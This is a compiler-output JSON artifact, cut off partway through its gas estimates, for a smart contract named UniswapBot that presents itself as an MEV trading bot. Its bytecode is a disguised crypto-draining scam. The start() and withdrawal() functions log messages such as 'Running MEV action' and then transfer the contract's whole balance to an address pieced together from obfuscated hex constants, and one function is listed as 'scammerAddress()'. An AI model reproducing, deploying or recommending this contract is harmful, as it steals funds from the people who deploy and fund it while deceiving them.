{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b50610c0a806100206000396000f3fe60806040526004361061004e5760003560e01c80636c02a9311461005a5780637b61c320146100ea578063ab1c067d1461017a578063be9a6555146101d1578063d4e93292146101db57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101e5565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100af578082015181840152602081019050610094565b50505050905090810190601f1680156100dc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100f657600080fd5b506100ff610283565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561013f578082015181840152602081019050610124565b50505050905090810190601f16801561016c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561018657600080fd5b5061018f610321565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101d9610338565b005b6101e36103d3565b005b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561027b5780601f106102505761010080835404028352916020019161027b565b820191906000526020600020905b81548152906001019060200180831161025e57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103195780601f106102ee57610100808354040283529160200191610319565b820191906000526020600020905b8154815290600101906020018083116102fc57829003601f168201915b505050505081565b600061033361032e61046e565b6105b7565b905090565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b9d6038913960400191505060405180910390a161038b610810565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103d0573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610b6a6033913960400191505060405180910390a1610426610827565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561046b573d6000803e3d6000fd5b50565b6060806104bf6040518060400160405280600181526020017f78000000000000000000000000000000000000000000000000000000000000008152506104ba6104b561083e565b61084a565b610950565b9050600064b00859c429905060006349edf9659050600062b71a32905060006104e6610aab565b905060006104f2610ab5565b90506060610508876105038861084a565b610950565b905060606105266105188761084a565b6105218761084a565b610950565b905060606105338561084a565b905060606105408561084a565b905060606105606105518686610950565b61055b8585610950565b610950565b905060606105a36040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610950565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a81101561080357610100840293508481815181106105e957fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061060b57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561065c575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561066c57605783039250610706565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156106aa575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106ba57603783039250610705565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106f8575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610704576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610744575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610754576057820391506107ee565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610792575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107a2576037820391506107ed565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107e0575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107ec576030820391505b5b5b816010840201840193506002810190506105cd565b5082945050505050919050565b600061082261081d61046e565b6105b7565b905090565b600061083961083461046e565b6105b7565b905090565b60006304b716d2905090565b6060600080905060008390505b600081146108795781806001019250506010818161087157fe5b049050610857565b60608267ffffffffffffffff8111801561089257600080fd5b506040519080825280601f01601f1916602001820160405280156108c55781602001600182028036833780820191505090505b50905060008090505b8381101561094457601086816108e057fe5b0692506108ec83610ac0565b82600183870303815181106108fd57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010868161093657fe5b0495508060010190506108ce565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff8111801561097857600080fd5b506040519080825280601f01601f1916602001820160405280156109ab5781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610a29578582815181106109d057fe5b602001015160f81c60f81b8382806001019350815181106109ed57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109bb565b600091505b8451821015610a9c57848281518110610a4357fe5b602001015160f81c60f81b838280600101935081518110610a6057fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610a2e565b82965050505050505092915050565b600061f06a905090565b600062060f9e905090565b60008160ff16600011158015610ada575060098260ff1611155b15610b0f57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610b64565b8160ff16600a11158015610b275750600f8260ff1611155b15610b5f57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610b64565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC0A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xEA JUMPI DUP1 PUSH4 0xAB1C067D EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x1D1 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x1DB JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1E5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xAF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x94 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xDC JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xFF PUSH2 0x283 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x13F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x124 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x16C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x186 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18F PUSH2 0x321 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1D9 PUSH2 0x338 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1E3 PUSH2 0x3D3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x27B JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x250 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x27B JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x25E JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x319 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x319 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x333 PUSH2 0x32E PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB9D PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x38B PUSH2 0x810 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB6A PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x426 PUSH2 0x827 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4BF PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x4BA PUSH2 0x4B5 PUSH2 0x83E JUMP JUMPDEST PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH5 0xB00859C429 SWAP1 POP PUSH1 0x0 PUSH4 0x49EDF965 SWAP1 POP PUSH1 0x0 PUSH3 0xB71A32 SWAP1 POP PUSH1 0x0 PUSH2 0x4E6 PUSH2 0xAAB JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4F2 PUSH2 0xAB5 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x508 DUP8 PUSH2 0x503 DUP9 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x526 PUSH2 0x518 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x521 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x533 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x540 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x560 PUSH2 0x551 DUP7 DUP7 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x55B DUP6 DUP6 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x950 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x803 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5E9 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x60B JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65C JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x706 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6BA JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x705 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F8 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x704 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x744 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x754 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7EE JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x792 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A2 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7ED JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7E0 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7EC JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5CD JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x822 PUSH2 0x81D PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x839 PUSH2 0x834 PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH4 0x4B716D2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x879 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x871 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x857 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x892 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x8C5 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x944 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x8E0 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8EC DUP4 PUSH2 0xAC0 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8FD JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x936 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x8CE JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x978 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x9AB JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA29 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9D0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9ED JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9BB JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA9C JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA43 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA60 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xA2E JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF06A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x60F9E SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xADA JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB0F JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB27 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB5F JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220E6F3 0x2F 0x1F 0xF LT 0x4A CALLDATALOAD DUP16 SAR CALLDATACOPY 0xA9 0xA8 PUSH12 0x740DA37A7D83DB8139B04A3D JUMPI 0x2E 0xEF SWAP12 0xDA CREATE PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "616400",
				"executionCost": "651",
				"totalCost": "617051"
			},
			"external": {
				"scammerAddress()": "infinite",
				"start()": "infinite",
				"tokenName()": "infinite",
				"tokenSymbol()": "infinite",
				"withdrawal()": "infinite"
			},
			"internal": {
				"_callMEVAction()": "infinite",
				"beyond(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct UniswapBot.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct UniswapBot.slice memory,struct UniswapBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "23",
				"getMemPoolHeight()": "23",
				"getMemPoolLength()": "infinite",
				"getMemPoolOffset()": "23",
				"keccak(struct UniswapBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
